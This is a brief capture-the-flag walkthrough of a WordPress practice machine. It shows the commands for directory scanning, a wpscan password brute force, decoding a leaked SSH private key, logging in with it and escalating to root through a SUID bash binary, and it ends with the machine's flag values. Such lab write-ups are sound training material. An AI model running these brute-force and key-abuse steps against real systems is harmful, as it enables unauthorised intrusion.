Machine has a wordpress site on the default web-page.

Gobuster identifies a hidden directory:

```php
gobuster dir -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/common.txt -u $IP
```

/robots
- /secret.txt -> possible  id_rsa key

```php
wpscan --url http://192.168.191.89/ -e u,vp 
```
- Identifies admin user

![[IMG/Pasted image 20240927071132.png]]

I try to brute force the admin account while i look around:

```php
wpscan --url http://192.168.191.89/wp-login.php -v -P /usr/share/wordlists/rockyou.txt -U admin
```

Looking at the main web-page again, i get the username.

![[IMG/Pasted image 20240927073114.png]]

I run the secret.txt through base64 decode and get the correct format:

```php
cat temp | base64 -d > id_rsa
```

prepare the file

```php
chmod 600 id_rsa
```

ssh into the machine with the id_rsa file

```php
ssh -i id_rsa oscp@$IP
```

The first flag is in local.txt in the users home directory:
`f403addfeabc8aa0098ba6ed29b6317b`

I run a quick scan for suid files and find that bash is set which gives me an easy priv-esc to the root user.

```php
find / -perm -u=s 2>/dev/null
```

![[IMG/Pasted image 20240927074651.png]]

cat /root/proof.txt
`381069ee441bf43f60b94fe4a47a4495`

---

**Completed:** _07:47 2024-09-27_

